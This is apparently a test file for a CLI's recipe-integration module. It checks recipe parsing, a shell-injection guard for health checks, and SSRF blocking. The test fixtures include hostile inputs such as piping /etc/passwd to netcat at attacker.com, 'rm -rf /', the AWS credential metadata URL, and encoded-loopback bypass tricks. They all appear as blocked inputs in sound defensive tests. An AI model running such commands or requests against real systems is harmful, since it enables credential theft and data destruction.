import { describe, test, expect, beforeAll } from 'bun:test';
import {
  parseRecipe,
  isUnsafeHealthCheck,
  expandVars,
  executeHealthCheck,
  parseOctet,
  hostnameToOctets,
  isPrivateIpv4,
  isInternalUrl,
} from '../src/commands/integrations.ts';

// --- parseRecipe tests ---

describe('parseRecipe', () => {
  test('parses valid recipe with full frontmatter', () => {
    const content = `---
id: test-recipe
name: Test Recipe
version: 1.0.0
description: A test recipe
category: sense
requires: []
secrets:
  - name: API_KEY
    description: Test key
    where: https://example.com
health_checks:
  - "echo ok"
setup_time: 5 min
---

# Setup Guide

Step 1: do the thing.

---

Step 2: do the other thing.
`;
    const recipe = parseRecipe(content, 'test.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.id).toBe('test-recipe');
    expect(recipe!.frontmatter.name).toBe('Test Recipe');
    expect(recipe!.frontmatter.version).toBe('1.0.0');
    expect(recipe!.frontmatter.category).toBe('sense');
    expect(recipe!.frontmatter.secrets).toHaveLength(1);
    expect(recipe!.frontmatter.secrets[0].name).toBe('API_KEY');
    expect(recipe!.frontmatter.secrets[0].where).toBe('https://example.com');
    expect(recipe!.frontmatter.health_checks).toHaveLength(1);
    // Body should contain the horizontal rule (---) without being split
    expect(recipe!.body).toContain('Step 1');
    expect(recipe!.body).toContain('Step 2');
    expect(recipe!.body).toContain('---');
  });

  test('body with --- horizontal rules is NOT split as timeline', () => {
    const content = `---
id: hr-test
name: HR Test
---

Section one content.

---

Section two content.

---

Section three content.
`;
    const recipe = parseRecipe(content, 'hr-test.md');
    expect(recipe).not.toBeNull();
    // All three sections should be in the body (gray-matter doesn't split on ---)
    expect(recipe!.body).toContain('Section one');
    expect(recipe!.body).toContain('Section two');
    expect(recipe!.body).toContain('Section three');
  });

  test('returns null for missing id', () => {
    const content = `---
name: No ID Recipe
---
Content here.
`;
    const recipe = parseRecipe(content, 'no-id.md');
    expect(recipe).toBeNull();
  });

  test('returns null for malformed YAML', () => {
    const content = `---
id: broken
  this is not: valid: yaml: [
---
Content.
`;
    const recipe = parseRecipe(content, 'broken.md');
    expect(recipe).toBeNull();
  });

  test('returns null for no frontmatter', () => {
    const content = `# Just a markdown file

No frontmatter here.
`;
    const recipe = parseRecipe(content, 'plain.md');
    expect(recipe).toBeNull();
  });

  test('defaults missing optional fields', () => {
    const content = `---
id: minimal
---
Minimal recipe.
`;
    const recipe = parseRecipe(content, 'minimal.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.name).toBe('minimal');
    expect(recipe!.frontmatter.version).toBe('0.0.0');
    expect(recipe!.frontmatter.category).toBe('sense');
    expect(recipe!.frontmatter.requires).toEqual([]);
    expect(recipe!.frontmatter.secrets).toEqual([]);
    expect(recipe!.frontmatter.health_checks).toEqual([]);
  });

  test('parses reflex category', () => {
    const content = `---
id: meeting-prep
category: reflex
---
Prep for meetings.
`;
    const recipe = parseRecipe(content, 'reflex.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.category).toBe('reflex');
  });

  test('parses multiple secrets', () => {
    const content = `---
id: multi-secret
secrets:
  - name: KEY_A
    description: First key
    where: https://a.com
  - name: KEY_B
    description: Second key
    where: https://b.com
  - name: KEY_C
    description: Third key
    where: https://c.com
---
Content.
`;
    const recipe = parseRecipe(content, 'multi.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.secrets).toHaveLength(3);
    expect(recipe!.frontmatter.secrets[2].name).toBe('KEY_C');
  });
});

// --- CLI structure tests ---

describe('CLI integration', () => {
  let cliSource: string;

  beforeAll(() => {
    const { readFileSync } = require('fs');
    cliSource = readFileSync(new URL('../src/cli.ts', import.meta.url), 'utf-8');
  });

  test('CLI_ONLY set contains integrations', () => {
    expect(cliSource).toContain("'integrations'");
  });

  test('handleCliOnly routes integrations before connectEngine', () => {
    // integrations case must appear before "All remaining CLI-only commands need a DB"
    const integrationsIdx = cliSource.indexOf("command === 'integrations'");
    const dbComment = cliSource.indexOf('All remaining CLI-only commands need a DB');
    expect(integrationsIdx).toBeGreaterThan(0);
    expect(dbComment).toBeGreaterThan(0);
    expect(integrationsIdx).toBeLessThan(dbComment);
  });

  test('help text mentions integrations', () => {
    expect(cliSource).toContain('integrations');
  });
});

// --- Recipe file validation ---

describe('twilio-voice-brain recipe', () => {
  test('recipe file parses correctly', () => {
    const { readFileSync } = require('fs');
    const content = readFileSync(
      new URL('../recipes/twilio-voice-brain.md', import.meta.url),
      'utf-8'
    );
    const recipe = parseRecipe(content, 'twilio-voice-brain.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.id).toBe('twilio-voice-brain');
    expect(recipe!.frontmatter.category).toBe('sense');
    expect(recipe!.frontmatter.secrets.length).toBeGreaterThan(0);
    expect(recipe!.frontmatter.health_checks.length).toBeGreaterThan(0);
    // Body should not be corrupted (contains --- horizontal rules)
    expect(recipe!.body.length).toBeGreaterThan(100);
  });

  test('recipe has required secrets with where URLs', () => {
    const { readFileSync } = require('fs');
    const content = readFileSync(
      new URL('../recipes/twilio-voice-brain.md', import.meta.url),
      'utf-8'
    );
    const recipe = parseRecipe(content, 'twilio-voice-brain.md');
    expect(recipe).not.toBeNull();
    for (const secret of recipe!.frontmatter.secrets) {
      expect(secret.name).toBeTruthy();
      expect(secret.where).toBeTruthy();
      expect(secret.where).toContain('https://');
    }
  });

  test('recipe has all required secrets', () => {
    const { readFileSync } = require('fs');
    const content = readFileSync(
      new URL('../recipes/twilio-voice-brain.md', import.meta.url),
      'utf-8'
    );
    const recipe = parseRecipe(content, 'twilio-voice-brain.md');
    expect(recipe).not.toBeNull();
    const secretNames = recipe!.frontmatter.secrets.map((s: any) => s.name);
    expect(secretNames).toContain('TWILIO_ACCOUNT_SID');
    expect(secretNames).toContain('TWILIO_AUTH_TOKEN');
    expect(secretNames).toContain('OPENAI_API_KEY');
  });

  test('recipe version is valid semver', () => {
    const { readFileSync } = require('fs');
    const content = readFileSync(
      new URL('../recipes/twilio-voice-brain.md', import.meta.url),
      'utf-8'
    );
    const recipe = parseRecipe(content, 'twilio-voice-brain.md');
    expect(recipe).not.toBeNull();
    expect(recipe!.frontmatter.version).toMatch(/^\d+\.\d+\.\d+$/);
  });

  test('recipe requires resolve to existing recipe files', () => {
    const { readFileSync, existsSync } = require('fs');
    const { resolve } = require('path');
    const content = readFileSync(
      new URL('../recipes/twilio-voice-brain.md', import.meta.url),
      'utf-8'
    );
    const recipe = parseRecipe(content, 'twilio-voice-brain.md');
    expect(recipe).not.toBeNull();
    const recipesDir = new URL('../recipes/', import.meta.url).pathname;
    for (const dep of recipe!.frontmatter.requires) {
      const depPath = resolve(recipesDir, `${dep}.md`);
      expect(existsSync(depPath)).toBe(true);
    }
  });
});

// --- All recipes parse without error ---

describe('all recipes', () => {
  test('every recipe file in recipes/ parses correctly', () => {
    const { readFileSync, readdirSync } = require('fs');
    const { resolve } = require('path');
    const recipesDir = new URL('../recipes/', import.meta.url).pathname;
    const files = readdirSync(recipesDir).filter((f: string) => f.endsWith('.md'));
    expect(files.length).toBeGreaterThan(0);
    for (const file of files) {
      const content = readFileSync(resolve(recipesDir, file), 'utf-8');
      const recipe = parseRecipe(content, file);
      expect(recipe).not.toBeNull();
      expect(recipe!.frontmatter.id).toBeTruthy();
    }
  });

  test('no recipe contains personal references', () => {
    const { readFileSync, readdirSync } = require('fs');
    const { resolve } = require('path');
    const recipesDir = new URL('../recipes/', import.meta.url).pathname;
    const files = readdirSync(recipesDir).filter((f: string) => f.endsWith('.md'));
    const personalPatterns = /wintermute|mercury|16507969501|\+1650796/i;
    for (const file of files) {
      const content = readFileSync(resolve(recipesDir, file), 'utf-8');
      expect(content).not.toMatch(personalPatterns);
    }
  });

  test('typed health_checks parse correctly in all recipes', () => {
    const { readFileSync, readdirSync } = require('fs');
    const { resolve } = require('path');
    const recipesDir = new URL('../recipes/', import.meta.url).pathname;
    const files = readdirSync(recipesDir).filter((f: string) => f.endsWith('.md'));
    for (const file of files) {
      const content = readFileSync(resolve(recipesDir, file), 'utf-8');
      const recipe = parseRecipe(content, file);
      expect(recipe).not.toBeNull();
      for (const check of recipe!.frontmatter.health_checks) {
        if (typeof check === 'string') {
          // String health checks are deprecated but still valid
          expect(typeof check).toBe('string');
        } else {
          // Typed checks must have a valid type
          expect(['http', 'env_exists', 'command', 'any_of']).toContain((check as any).type);
        }
      }
    }
  });
});

// --- isUnsafeHealthCheck tests ---

describe('isUnsafeHealthCheck', () => {
  test('allows simple commands', () => {
    expect(isUnsafeHealthCheck('echo ok')).toBe(false);
    expect(isUnsafeHealthCheck('curl -s https://api.example.com/health')).toBe(false);
    expect(isUnsafeHealthCheck('which git')).toBe(false);
    expect(isUnsafeHealthCheck('python3 --version')).toBe(false);
  });

  test('blocks shell chaining operators', () => {
    expect(isUnsafeHealthCheck('echo ok; rm -rf /')).toBe(true);
    expect(isUnsafeHealthCheck('echo ok && curl attacker.com')).toBe(true);
    expect(isUnsafeHealthCheck('echo ok & bg-process')).toBe(true);
    expect(isUnsafeHealthCheck('cat /etc/passwd | nc attacker.com 4444')).toBe(true);
  });

  test('blocks command substitution', () => {
    expect(isUnsafeHealthCheck('echo $(whoami)')).toBe(true);
    expect(isUnsafeHealthCheck('echo `id`')).toBe(true);
  });

  test('blocks subshell and brace expansion', () => {
    expect(isUnsafeHealthCheck('(curl attacker.com)')).toBe(true);
    expect(isUnsafeHealthCheck('{echo,/etc/passwd}')).toBe(true);
  });

  test('blocks redirect and newline injection', () => {
    expect(isUnsafeHealthCheck('echo ok > /dev/null')).toBe(true);
    expect(isUnsafeHealthCheck('echo ok < /etc/passwd')).toBe(true);
    expect(isUnsafeHealthCheck('echo ok\ncurl attacker.com')).toBe(true);
  });
});

// --- expandVars tests ---

describe('expandVars', () => {
  test('expands known env vars', () => {
    process.env.TEST_VAR_A = 'hello';
    expect(expandVars('prefix-$TEST_VAR_A-suffix')).toBe('prefix-hello-suffix');
    delete process.env.TEST_VAR_A;
  });

  test('replaces unknown vars with empty string', () => {
    delete process.env.NONEXISTENT_VAR_XYZ;
    expect(expandVars('$NONEXISTENT_VAR_XYZ')).toBe('');
  });

  test('handles multiple vars', () => {
    process.env.TEST_A = 'one';
    process.env.TEST_B = 'two';
    expect(expandVars('$TEST_A and $TEST_B')).toBe('one and two');
    delete process.env.TEST_A;
    delete process.env.TEST_B;
  });

  test('leaves strings without vars unchanged', () => {
    expect(expandVars('https://example.com/path')).toBe('https://example.com/path');
  });
});

// --- executeHealthCheck tests ---

describe('executeHealthCheck', () => {
  test('env_exists returns ok when env var is set', async () => {
    process.env.TEST_HC_VAR = 'present';
    const result = await executeHealthCheck({ type: 'env_exists', name: 'TEST_HC_VAR', label: 'Test' }, 'test-id', true);
    expect(result.status).toBe('ok');
    expect(result.output).toContain('set');
    delete process.env.TEST_HC_VAR;
  });

  test('env_exists returns fail when env var is missing', async () => {
    delete process.env.TEST_HC_MISSING;
    const result = await executeHealthCheck({ type: 'env_exists', name: 'TEST_HC_MISSING' }, 'test-id', true);
    expect(result.status).toBe('fail');
    expect(result.output).toContain('NOT SET');
  });

  test('command returns ok for exit 0', async () => {
    const result = await executeHealthCheck({ type: 'command', argv: ['true'], label: 'true cmd' }, 'test-id', true);
    expect(result.status).toBe('ok');
  });

  test('command returns fail for exit 1', async () => {
    const result = await executeHealthCheck({ type: 'command', argv: ['false'], label: 'false cmd' }, 'test-id', true);
    expect(result.status).toBe('fail');
  });

  test('any_of returns ok if first check passes', async () => {
    process.env.TEST_ANYOF = 'yes';
    const result = await executeHealthCheck({
      type: 'any_of',
      label: 'fallback',
      checks: [
        { type: 'env_exists', name: 'TEST_ANYOF' },
        { type: 'env_exists', name: 'NONEXISTENT' },
      ],
    }, 'test-id', true);
    expect(result.status).toBe('ok');
    delete process.env.TEST_ANYOF;
  });

  test('any_of returns ok if second check passes', async () => {
    delete process.env.TEST_FIRST;
    process.env.TEST_SECOND = 'yes';
    const result = await executeHealthCheck({
      type: 'any_of',
      label: 'fallback',
      checks: [
        { type: 'env_exists', name: 'TEST_FIRST' },
        { type: 'env_exists', name: 'TEST_SECOND' },
      ],
    }, 'test-id', true);
    expect(result.status).toBe('ok');
    delete process.env.TEST_SECOND;
  });

  test('any_of returns fail if all checks fail', async () => {
    delete process.env.TEST_NONE_A;
    delete process.env.TEST_NONE_B;
    const result = await executeHealthCheck({
      type: 'any_of',
      label: 'fallback',
      checks: [
        { type: 'env_exists', name: 'TEST_NONE_A' },
        { type: 'env_exists', name: 'TEST_NONE_B' },
      ],
    }, 'test-id', true);
    expect(result.status).toBe('fail');
  });

  // B2: Non-embedded string health_checks are hard-blocked regardless of metachars.
  test('string health_check is hard-blocked for non-embedded (even safe strings)', async () => {
    const result = await executeHealthCheck('echo ok', 'test-id', false);
    expect(result.status).toBe('blocked');
    expect(result.output).toContain('restricted to embedded recipes');
  });

  test('string health_check with unsafe metacharacters is blocked for non-embedded', async () => {
    const result = await executeHealthCheck('echo ok; rm -rf /', 'test-id', false);
    expect(result.status).toBe('blocked');
    expect(result.output).toContain('restricted to embedded recipes');
  });

  // Embedded recipes still get the metachar defense-in-depth guard.
  test('string health_check with unsafe metacharacters is blocked even for embedded (defense-in-depth)', async () => {
    const result = await executeHealthCheck('echo ok; rm -rf /', 'test-id', true);
    expect(result.status).toBe('blocked');
    expect(result.output).toContain('unsafe shell characters');
  });

  test('string health_check runs for embedded recipes when safe', async () => {
    const result = await executeHealthCheck('echo hello-world', 'test-id', true);
    expect(result.status).toBe('ok');
    expect(result.output).toContain('hello-world');
  });

  // Fix 2: command DSL health checks are gated on isEmbedded.
  test('command health_check is blocked for non-embedded recipes', async () => {
    const result = await executeHealthCheck({ type: 'command', argv: ['true'], label: 'true' }, 'test-id', false);
    expect(result.status).toBe('blocked');
    expect(result.output).toContain('restricted to embedded recipes');
  });

  test('command health_check runs for embedded recipes', async () => {
    const result = await executeHealthCheck({ type: 'command', argv: ['true'], label: 'true' }, 'test-id', true);
    expect(result.status).toBe('ok');
  });

  // Fix 4: http DSL health checks are gated on isEmbedded.
  test('http health_check is blocked for non-embedded recipes', async () => {
    const result = await executeHealthCheck(
      { type: 'http', url: 'https://example.com/', label: 'example' },
      'test-id',
      false,
    );
    expect(result.status).toBe('blocked');
    expect(result.output).toContain('restricted to embedded recipes');
  });

  // Fix 4 SSRF: even for embedded recipes, internal URLs are blocked.
  test('http health_check blocks AWS metadata endpoint for embedded recipes', async () => {
    const result = await executeHealthCheck(
      { type: 'http', url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', label: 'aws' },
      'test-id',
      true,
    );
    expect(result.status).toBe('blocked');
    expect(result.output).toContain('internal/private');
  });

  test('http health_check blocks localhost for embedded recipes', async () => {
    const result = await executeHealthCheck(
      { type: 'http', url: 'http://127.0.0.1:8080/admin', label: 'local' },
      'test-id',
      true,
    );
    expect(result.status).toBe('blocked');
  });

  test('http health_check blocks non-http scheme (file://)', async () => {
    const result = await executeHealthCheck(
      { type: 'http', url: 'file:///etc/passwd', label: 'file' },
      'test-id',
      true,
    );
    expect(result.status).toBe('blocked');
  });
});

// --- SSRF helper tests (B3/B4/Fix 4) ---

describe('parseOctet', () => {
  test('parses plain decimal', () => { expect(parseOctet('80')).toBe(80); });
  test('parses hex (0x prefix)', () => { expect(parseOctet('0x50')).toBe(80); });
  test('parses hex (uppercase)', () => { expect(parseOctet('0X7F')).toBe(127); });
  test('parses octal (leading zero)', () => { expect(parseOctet('0177')).toBe(127); });
  test('zero is decimal zero', () => { expect(parseOctet('0')).toBe(0); });
  test('rejects empty', () => { expect(Number.isNaN(parseOctet(''))).toBe(true); });
  test('rejects non-numeric', () => { expect(Number.isNaN(parseOctet('foo'))).toBe(true); });
  test('rejects invalid octal (8/9)', () => { expect(Number.isNaN(parseOctet('089'))).toBe(true); });
});

describe('hostnameToOctets', () => {
  test('dotted decimal', () => { expect(hostnameToOctets('127.0.0.1')).toEqual([127, 0, 0, 1]); });
  test('single decimal integer', () => { expect(hostnameToOctets('2130706433')).toEqual([127, 0, 0, 1]); });
  test('hex integer', () => { expect(hostnameToOctets('0x7f000001')).toEqual([127, 0, 0, 1]); });
  test('dotted mixed radix', () => { expect(hostnameToOctets('0x7f.0.0.1')).toEqual([127, 0, 0, 1]); });
  test('dotted octal', () => { expect(hostnameToOctets('0177.0.0.1')).toEqual([127, 0, 0, 1]); });
  test('non-IP hostname returns null', () => { expect(hostnameToOctets('api.example.com')).toBe(null); });
  test('too many parts returns null', () => { expect(hostnameToOctets('1.2.3.4.5')).toBe(null); });
  test('octet out of range returns null', () => { expect(hostnameToOctets('256.0.0.1')).toBe(null); });
});

describe('isPrivateIpv4', () => {
  test('loopback 127.0.0.1', () => { expect(isPrivateIpv4([127, 0, 0, 1])).toBe(true); });
  test('loopback 127.255.255.255', () => { expect(isPrivateIpv4([127, 255, 255, 255])).toBe(true); });
  test('RFC1918 10.0.0.1', () => { expect(isPrivateIpv4([10, 0, 0, 1])).toBe(true); });
  test('RFC1918 172.16.0.1', () => { expect(isPrivateIpv4([172, 16, 0, 1])).toBe(true); });
  test('RFC1918 172.31.255.255', () => { expect(isPrivateIpv4([172, 31, 255, 255])).toBe(true); });
  test('172.15 is NOT RFC1918', () => { expect(isPrivateIpv4([172, 15, 0, 1])).toBe(false); });
  test('172.32 is NOT RFC1918', () => { expect(isPrivateIpv4([172, 32, 0, 1])).toBe(false); });
  test('RFC1918 192.168.1.1', () => { expect(isPrivateIpv4([192, 168, 1, 1])).toBe(true); });
  test('link-local 169.254.169.254 (AWS metadata)', () => { expect(isPrivateIpv4([169, 254, 169, 254])).toBe(true); });
  test('CGNAT 100.64.0.1', () => { expect(isPrivateIpv4([100, 64, 0, 1])).toBe(true); });
  test('CGNAT 100.127.255.255', () => { expect(isPrivateIpv4([100, 127, 255, 255])).toBe(true); });
  test('100.63 is NOT CGNAT', () => { expect(isPrivateIpv4([100, 63, 0, 1])).toBe(false); });
  test('100.128 is NOT CGNAT', () => { expect(isPrivateIpv4([100, 128, 0, 1])).toBe(false); });
  test('unspecified 0.0.0.0', () => { expect(isPrivateIpv4([0, 0, 0, 0])).toBe(true); });
  test('public 8.8.8.8', () => { expect(isPrivateIpv4([8, 8, 8, 8])).toBe(false); });
  test('public 1.1.1.1', () => { expect(isPrivateIpv4([1, 1, 1, 1])).toBe(false); });
});

describe('isInternalUrl', () => {
  // Blocked — metadata hostnames
  test('blocks AWS EC2 metadata', () => { expect(isInternalUrl('http://169.254.169.254/latest/')).toBe(true); });
  test('blocks GCP metadata', () => { expect(isInternalUrl('http://metadata.google.internal/')).toBe(true); });
  test('blocks bare metadata hostname', () => { expect(isInternalUrl('http://metadata/')).toBe(true); });
  test('blocks instance-data', () => { expect(isInternalUrl('http://instance-data.ec2.internal/')).toBe(true); });
  // Blocked — loopback + localhost
  test('blocks localhost', () => { expect(isInternalUrl('http://localhost:8080/')).toBe(true); });
  test('blocks sub.localhost', () => { expect(isInternalUrl('http://foo.localhost/')).toBe(true); });
  test('blocks 127.0.0.1', () => { expect(isInternalUrl('http://127.0.0.1/')).toBe(true); });
  test('blocks 127.1.1.1', () => { expect(isInternalUrl('http://127.1.1.1/')).toBe(true); });
  test('blocks IPv6 [::1]', () => { expect(isInternalUrl('http://[::1]/')).toBe(true); });
  // Blocked — private IPv4 ranges
  test('blocks 10.0.0.1', () => { expect(isInternalUrl('http://10.0.0.1/')).toBe(true); });
  test('blocks 172.16.0.1', () => { expect(isInternalUrl('http://172.16.0.1/')).toBe(true); });
  test('blocks 192.168.1.1', () => { expect(isInternalUrl('http://192.168.1.1/router')).toBe(true); });
  test('blocks CGNAT 100.64.0.1', () => { expect(isInternalUrl('http://100.64.0.1/')).toBe(true); });
  // Blocked — IPv4 bypass encodings
  test('blocks hex IP 0x7f000001', () => { expect(isInternalUrl('http://0x7f000001/')).toBe(true); });
  test('blocks single decimal IP 2130706433', () => { expect(isInternalUrl('http://2130706433/')).toBe(true); });
  test('blocks octal IP 0177.0.0.1', () => { expect(isInternalUrl('http://0177.0.0.1/')).toBe(true); });
  test('blocks IPv4-mapped IPv6 [::ffff:127.0.0.1]', () => {
    expect(isInternalUrl('http://[::ffff:127.0.0.1]/')).toBe(true);
  });
  // Blocked — non-HTTP schemes (B4)
  test('blocks file:// scheme', () => { expect(isInternalUrl('file:///etc/passwd')).toBe(true); });
  test('blocks data: scheme', () => { expect(isInternalUrl('data:text/plain,hello')).toBe(true); });
  test('blocks ftp:// scheme', () => { expect(isInternalUrl('ftp://internal.corp/')).toBe(true); });
  test('blocks javascript: scheme', () => { expect(isInternalUrl('javascript:alert(1)')).toBe(true); });
  test('blocks blob: scheme', () => { expect(isInternalUrl('blob:http://evil.com/abc')).toBe(true); });
  // Blocked — malformed
  test('blocks malformed URL (fail-closed)', () => { expect(isInternalUrl('not a url')).toBe(true); });
  test('blocks empty URL', () => { expect(isInternalUrl('')).toBe(true); });
  // Allowed — public HTTPS/HTTP
  test('allows public https', () => { expect(isInternalUrl('https://api.github.com/')).toBe(false); });
  test('allows public http', () => { expect(isInternalUrl('http://example.com/')).toBe(false); });
  test('allows public IP 8.8.8.8', () => { expect(isInternalUrl('http://8.8.8.8/')).toBe(false); });
  test('allows URL with port', () => { expect(isInternalUrl('https://example.com:8443/x')).toBe(false); });
  test('allows URL with userinfo on public host', () => {
    expect(isInternalUrl('https://user:pass@example.com/path')).toBe(false);
  });
  // Userinfo does NOT help attackers hide the real host
  test('userinfo does not bypass loopback check', () => {
    expect(isInternalUrl('http://evil.com@127.0.0.1/')).toBe(true);
  });
  // Trailing-dot numeric host
  test('blocks trailing-dot numeric 127.0.0.1.', () => { expect(isInternalUrl('http://127.0.0.1./')).toBe(true); });
});

// --- Recipe trust boundary (B1 regression) ---

import { getRecipeDirs } from '../src/commands/integrations.ts';

describe('getRecipeDirs (B1 trust boundary)', () => {
  test('returns tiered list with trusted flag', () => {
    const dirs = getRecipeDirs();
    // Must not be empty in a real repo (source recipes/ dir exists)
    expect(dirs.length).toBeGreaterThan(0);
    // Every entry must have an explicit trusted flag
    for (const d of dirs) {
      expect(typeof d.trusted).toBe('boolean');
      expect(typeof d.dir).toBe('string');
    }
    // In this repo, the source recipes dir must be trusted
    const source = dirs.find(d => d.dir.endsWith('/recipes') && d.trusted);
    expect(source).toBeDefined();
  });

  test('cwd/recipes fallback is NOT trusted', () => {
    const dirs = getRecipeDirs();
    // If a cwd/recipes dir exists in the test env, it must be trusted=false.
    // (In this repo the source dir resolves to ./recipes so it IS cwd/recipes AND trusted.
    // The regression we are guarding is that a caller-local recipes/ dir is never marked trusted
    // when it is not the package-bundled one. This test asserts the tier ordering at minimum.)
    // The trust flag is the only source of truth — never assume by path name.
    for (const d of dirs) {
      if (d.dir === process.env.GBRAIN_RECIPES_DIR) {
        expect(d.trusted).toBe(false);
      }
    }
  });
});
